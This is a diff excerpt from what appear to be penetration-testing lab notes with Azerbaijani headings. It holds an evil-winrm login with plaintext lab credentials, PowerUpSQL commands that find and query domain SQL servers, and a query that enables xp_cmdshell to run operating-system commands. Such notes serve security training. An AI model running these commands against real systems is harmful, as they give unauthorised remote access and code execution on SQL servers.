@@ -92,7 +92,7 @@ evil-winrm -i 10.129.201.234 -u forend -p 'Klmcargo2'
 ## SQL instansiyalarını tapmaq
 Get-SQLInstanceDomain
 ## SQL sorğusu icra etmək (Versiyanı yoxlamaq)
-Get-SQLQuery -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version' -Verbose
+Get-SQLQuery -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query "Select @@version" -Verbose
 
 Get-SQLQuery -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;" -Verbose
 
